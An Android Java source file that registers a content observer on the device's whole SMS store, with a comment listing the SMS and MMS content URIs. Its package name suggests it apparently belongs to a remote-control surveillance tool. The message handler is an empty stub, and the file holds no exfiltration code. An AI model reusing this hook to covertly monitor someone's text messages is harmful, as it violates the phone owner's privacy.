package com.ht.RCSAndroidGUI.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.ht.RCSAndroidGUI.Status;

public class SmsHandler extends Thread {
	private static final String TAG = "SmsHandler";
	
	private Handler handler;
	private ContentObserver smsObserver;
	
	public void run() {
		Looper.prepare();
		
		handler = new Handler() {
			public void handleMessage(Message msg) {
				// process incoming messages here
			}
		};

		smsObserver = new SmsObserver(handler);
		
		ContentResolver cr = Status.getAppContext().getContentResolver();
		
		/* I possibili content resolver sono
			Inbox = "content://sms/inbox"
			Failed = "content://sms/failed" 
			Queued = "content://sms/queued" 
			Sent = "content://sms/sent" 
			Draft = "content://sms/draft"
			Outbox = "content://sms/outbox"
			Undelivered = "content://sms/undelivered"
			All = "content://sms/all"
			Conversations = "content://sms/conversations"
			All Conversations = "content://mms-sms/conversations"
			All messages = "content://mms-sms"
			All SMS = "content://sms"
		*/
		cr.registerContentObserver(Uri.parse("content://sms"), true, smsObserver);
		
		Looper.loop();
	}
	
	public void quit() {
		if (handler != null)
			handler.getLooper().quit();
	}
}
